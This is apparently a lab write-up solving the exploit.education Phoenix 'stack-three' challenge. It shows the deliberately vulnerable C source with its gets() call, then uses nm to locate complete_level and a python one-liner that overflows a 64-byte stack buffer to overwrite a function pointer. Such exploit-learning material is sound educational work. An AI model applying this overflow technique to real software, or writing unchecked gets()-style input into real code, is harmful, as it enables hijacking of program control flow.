## Stack Three
Stack Three looks at overwriting function pointers stored on the stack.

## Source Code
```c
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

## Challenge
The aim is to execute the function `complete_level` by modifying the `fp` variable.

## Solution
`locals.fp` is a function pointer and the function it points to gets called (`locals.fp()`).
We can overwrite it's value with the address of the function `complete_level()` in order to execute it.

### The Plan
Leverage `gets()` to overflow `locals.buffer` and write the address of `complete_level()` to `locals.fp`.

### Breaking it
> An `ELF` program's symbol table holds information needed to locate and relocate a program's symbolic definitions and references.
Symbols are a symbolic reference to some type of data or code such as a global variable or function.

Among the symbols we can find the address to `complete_level()`.
```console
user@phoenix-amd64:~$ nm /opt/phoenix/amd64/stack-three
0000000000600958 d _DYNAMIC
0000000000600ac8 d _GLOBAL_OFFSET_TABLE_
0000000000600940 d __CTOR_END__
0000000000600938 d __CTOR_LIST__
0000000000600950 D __DTOR_END__
0000000000600948 d __DTOR_LIST__
00000000004008f0 r __EH_FRAME_BEGIN__
0000000000400930 r __FRAME_END__
0000000000400888 r __GNU_EH_FRAME_HDR
0000000000600b18 D __TMC_END__
0000000000600b18 B __bss_start
0000000000400740 t __do_global_ctors_aux
00000000004005e0 t __do_global_dtors_aux
0000000000600b10 D __dso_handle
                 U __libc_start_main
0000000000600b18 D _edata
0000000000600b90 B _end
0000000000400782 T _fini
00000000004004b0 T _init
0000000000400530 T _start
0000000000400546 T _start_c
000000000040069d T complete_level
0000000000600b40 b completed.5577
0000000000400570 t deregister_tm_clones
0000000000600b48 b dtor_idx.5579
                 U exit
                 U fflush
0000000000400670 t frame_dummy
                 U gets
00000000004006b5 T main
0000000000600b60 b object.5589
                 U printf
                 U puts
00000000004005a0 t register_tm_clones
0000000000600b20 B stdout
```
`0x000000000040069d` -> `complete_level()`
> Notice an address in `x64` architecture is 64 bits (8 bytes), also called a `QWORD`.

We know `locals.fp` is initialized to `NULL`, thus it is zerod out (`0x0000000000000000`) and because the system is `little-endian` we only need to write the least significant bytes (`0x40069d`).
![](/images/stack-3/0.png)

```console
user@phoenix-amd64:~$ python -c "print 'a'*64 + '\x9d\x06\x40'" | /opt/phoenix/amd64/stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
🥳
